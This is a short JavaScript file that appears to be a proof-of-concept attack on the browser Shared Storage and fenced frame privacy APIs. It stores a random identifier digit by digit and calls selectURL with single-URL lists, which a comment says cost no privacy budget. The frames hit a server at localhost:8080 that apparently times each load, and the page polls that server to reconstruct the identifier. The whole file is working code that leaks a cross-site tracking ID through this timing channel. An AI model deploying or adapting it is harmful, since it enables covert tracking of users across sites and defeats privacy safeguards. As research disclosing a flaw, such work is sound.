const idServer = "localhost:8080";

function drawFrame(id) {
	const frame = document.createElement('fencedframe');
	frame.id = id;
	frame.mode = "opaque-ads";
	document.body.appendChild(frame);
}

function drawFrames() {
	for (let i = 0; i < maxDigits; i++) {
		drawFrame(`id-slot-digit-${i}`);
	}
}

drawFrames();

async function timeCaptureStart() {
	await fetch(`http://${idServer}/time-capture-start?id=${uuid}`);
}

async function injectIds() {
	await timeCaptureStart();

	await window.sharedStorage.worklet.addModule('id-worklet.js');

	for (let i = 0; i < maxDigits; i++) {
		const random = Math.floor(Math.random() * maxChar)
		await window.sharedStorage.set(`identifier-${i}`, random, {
			ignoreIfPresent: true,
		});
	}

	const resolveToConfig = typeof window.FencedFrameConfig !== 'undefined';

	// log2(1) = 0 no budget
	const timeCaptureUrl = `http://${idServer}/time-capture?id=${uuid}`;

	for (let i = 0; i < maxDigits; i++) {
		const selectedUrl = await window.sharedStorage.selectURL(`identifier`, [{
			url: timeCaptureUrl + `&index=${i}`,
		}], {
			data: { "index": i },
			resolveToConfig,
			keepAlive: true,
		});


		const idSlot = document.getElementById('id-slot-digit-' + i);
		if (resolveToConfig && selectedUrl instanceof FencedFrameConfig) {
			idSlot.config = selectedUrl;
		} else {
			idSlot.src = selectedUrl;
		}
	}
}

let extractInterval = setInterval(() => {
	fetch(`http://${idServer}/id?id=${uuid}`).then((response) => response.json()).then((data) => {
		document.querySelector(".red").innerHTML = data;
	}
	)
}, 3000)

injectIds();
